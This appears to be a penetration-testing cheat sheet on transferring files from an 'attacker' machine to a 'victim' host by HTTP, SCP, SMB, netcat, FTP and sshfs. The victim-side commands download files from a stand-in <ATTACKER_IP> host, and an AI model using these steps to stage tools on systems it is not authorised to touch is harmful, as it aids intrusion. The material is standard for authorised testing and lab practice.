
## 1. HTTP Method (Simplest for any OS)

_Best for: Quick transfers, one-time use._

### Attacker (Sender)

```
# Python 3
python3 -m http.server 80

# Or using PHP
php -S 0.0.0.0:80

# or using apache2
sudo systemctl satrt apache2
```

### Victim (Receiver)

```
Linux wget http://<ATTACKER_IP>/filename  
curl -O http://<ATTACKER_IP>/filename
    
Windows (PowerShell) iwr -uri http://<ATTACKER_IP>/filename -OutFile filename
wget http://ip/filename -o filename
curl http://ip/filename -O filename
    
```

## 2. SCP / SSH Method

_Best for: Encrypted and secure transfers._

### Attacker (Sender)

```
# Push file to victim
scp /path/to/local/file username@<VICTIM_IP>:/tmp/
```

### Victim (Receiver)

_(Victim ko bas SSH service on karni hogi: `sudo systemctl start ssh`)_

## 3. SMB Method (Windows/Linux)

_Best for: Transferring between Linux and Windows seamlessly._

### Attacker (Sender - Hosting SMB)

_Install impacket for quick SMB server:_

Bash

```
impacket-smbserver shareName /path/to/folder -smb2support
```

### Victim (Receiver - Mounting SMB)

```
- **Linux:** mount -t cifs //<ATTACKER_IP>/shareName /mnt -o username=guest,password=guest
    
- **Windows:** net use Z: \\<ATTACKER_IP>\shareName
    
```
## 4. Netcat (The "Raw" Way)

_Best for: When no other tools are allowed or available._

### Attacker (Sender)


```
# Prepare the file to be sent
nc -lvnp 1234 < file_to_send
```

### Victim (Receiver)

Bash

```
# Connect and pull the file
nc <ATTACKER_IP> 1234 > received_file
```

## 5. FTP Method

_Best for: Large files or legacy systems._

### Attacker (Sender)

_Setup an FTP server using python or pure-ftpd._


```
# Simple Python FTP server
sudo python3 -m pyftpdlib -p 21
```

### Victim (Receiver)

```
Linux ftp <ATTACKER_IP> -> get filename
    
Windows ftp <ATTACKER_IP> ->  get filename
```


## 6.SSH Filesystem (`sshfs`)

Best for: Editing remote files directly from your local machine .

### Attacker (Source):

- _Make sure SSH server is running (`sudo systemctl start ssh`)._

### Victim (Receiver):

#### i. Create a local mount point
```
mkdir ~/remote_files
```

#### ii. Mount the remote directory
```
sshfs username@<ATTACKER_IP>:/path/to/remote/folder ~/remote_files
```

#### iii. Use it like a local folder
```
cd ~/remote_files
```

#### iv. Unmount when finished
```
fusermount -u ~/remote_files
```

---
